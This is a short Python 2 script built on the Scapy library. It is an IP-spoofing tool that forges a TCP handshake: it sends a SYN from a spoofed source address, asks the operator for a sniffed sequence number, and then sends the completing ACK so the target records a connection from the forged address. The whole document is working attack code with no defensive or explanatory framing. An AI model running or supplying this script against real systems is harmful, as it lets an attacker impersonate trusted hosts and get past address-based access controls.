#!/usr/bin/env python

import sys
from scapy import *
conf.verb=0

if len(sys.argv) != 4:
    print "Usage: ./spoof.py <target> <spoofed_ip> <port>"
    sys.exit(1)

target = sys.argv[1]
spoofed_ip = sys.argv[2]
port = int(sys.argv[3])

p1=IP(dst=target,src=spoofed_ip)/TCP(dport=port,sport=5000,flags='S')
send(p1)
print "Okay, SYN sent. Enter the sniffed sequence number now: "

seq=sys.stdin.readline()
print "Okay, using sequence number " + seq

seq=int(seq[:-1])
p2=IP(dst=target,src=spoofed_ip)/TCP(dport=port,sport=5000,flags='A',ack=seq+1,seq=1)
send(p2)

print "Okay, final ACK sent. Check netstat on your target :-)"

